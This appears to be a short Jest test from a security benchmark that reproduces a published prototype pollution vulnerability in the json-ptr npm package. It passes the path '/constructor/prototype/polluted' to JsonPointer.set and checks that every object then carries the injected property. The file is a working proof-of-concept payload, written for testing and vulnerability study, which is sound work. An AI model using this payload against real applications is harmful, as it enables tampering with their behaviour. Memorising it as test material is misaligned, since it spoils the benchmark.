//https://snyk.io/vuln/SNYK-JS-JSONPTR-1016939
test("prototype pollution in json-ptr", () => {
  expect({}.polluted).toBe(undefined);

  const { JsonPointer } = require("json-ptr");
  JsonPointer.set({}, process.env.SECBENCH_PAYLOAD || ("/constructor/prototype/polluted"), "yes", true);

  expect({}.polluted).toBe("yes");
});
